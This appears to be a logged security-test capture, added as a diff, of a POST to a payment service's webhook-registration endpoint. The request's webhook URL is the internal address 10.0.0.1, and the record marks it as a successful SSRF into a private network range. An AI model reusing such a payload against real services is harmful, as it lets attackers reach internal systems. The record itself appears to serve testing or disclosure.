@@ -1,0 +1,43 @@
+{
+  "captured_at": "2026-05-28T00:58:07.219384+00:00",
+  "attempt_id": "5ee2fb57-8bfe-4e5f-8e76-813b1d6e9698",
+  "elapsed_ms": 354.32,
+  "outcome": "success-ssrf-rfc1918-10",
+  "request": {
+    "method": "POST",
+    "url": "https://api.balampay.com/webhooks/register",
+    "headers": {
+      "Content-Type": "application/json",
+      "x-api-key": "REDACTED(40)",
+      "Authorization": "REDACTED(872)",
+      "Accept": "application/json",
+      "Idempotency-Key": "3593d2dd-2436-42a1-982e-fd49a96dbd2b"
+    },
+    "body": {
+      "webhook_url": "http://10.0.0.1/",
+      "secret": "REDACTED(32)",
+      "client_uuid": "<client_id-redacted>"
+    }
+  },
+  "response": {
+    "status": 200,
+    "headers": {
+      "date": "Thu, 28 May 2026 00:58:07 GMT",
+      "content-type": "application/json",
+      "transfer-encoding": "chunked",
+      "connection": "keep-alive",
+      "x-amzn-requestid": "b9a5443a-1d02-48df-86d9-1303110e5967",
+      "x-amzn-remapped-content-length": "51",
+      "x-amz-apigw-id": "eDPs6GU1vHcEZTg=",
+      "x-amzn-trace-id": "Root=1-6a17931f-48d69c35692f68bf3de99fb9;Sampled=1;Lineage=1:0865cdb1:0",
+      "cf-cache-status": "DYNAMIC",
+      "set-cookie": "REDACTED(306)",
+      "content-encoding": "gzip",
+      "server": "cloudflare",
+      "cf-ray": "a0294f2169c78cbb-BOG"
+    },
+    "body": {
+      "message": "Webhook registered successfully"
+    }
+  }
+}
